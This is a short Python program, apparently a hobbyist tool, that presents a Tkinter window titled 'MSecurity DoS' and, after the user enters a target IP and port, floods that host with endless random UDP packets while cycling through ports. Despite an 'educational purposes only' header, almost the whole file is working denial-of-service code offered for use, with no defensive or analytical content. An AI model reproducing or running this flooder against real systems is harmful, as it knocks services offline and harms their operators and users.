# Developed by bl3ss902
# For educational purposes only
# DoS and DDoS attack tool, please use it responsibly and ethically.


from random import random
import socket
from tkinter import *
from tkinter.ttk import *
from time import strftime


def time():

    string = strftime('%H:%M:%S %p')

    lbl.config(text=string)

    lbl.after(1000, time)


def attack():
    import sys
    import os
    import time
    import socket
    import random 
    from datetime import datetime
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year


    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)


    os.system("clear")

    global pr
    pr = E1.get()
    ip = pr
    global rt
    rt = E2.get()
    port = (int(rt))

    os.system("clear")
    print("[>                      ] 0% ")
    time.sleep(0.5)
    print("[=====>      M          ] 25%")
    time.sleep(0.5)
    print("[==========> S          ] 50%")
    time.sleep(0.5)
    print("[==========  T ====>    ] 75%")
    time.sleep(0.5)
    print("[==========  Y ========>] 100%")
    time.sleep(3)
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s throught port:%s -by MSecurity DoS" %
              (sent, ip, port))
        if port == 65534:
            port = 1

    pass




root = Tk()
root.title("MSecurity DoS")
root.geometry("350x200+385+105")
root.resizable(0, 0)

lbl = Label(root, font=('calibri', 20, 'bold'),
            
            background='orange',
            
            foreground='red')

lbl.pack(anchor='s')
time()

global E1
global E2
L1 = Label(root, text="Target IP:", font=("Arial Bold", 10))
L1.pack(side=TOP)
E1 = Entry(root)
E1.pack(side=TOP)

L2 = Label(root, text="Target Port:", font=("Arial Bold", 10))
L2.pack(side=TOP)
E2 = Entry(root)
E2.pack(side=TOP)

button = Button(root, text="Start Attack", command=attack).pack(
    side=TOP)
root.mainloop()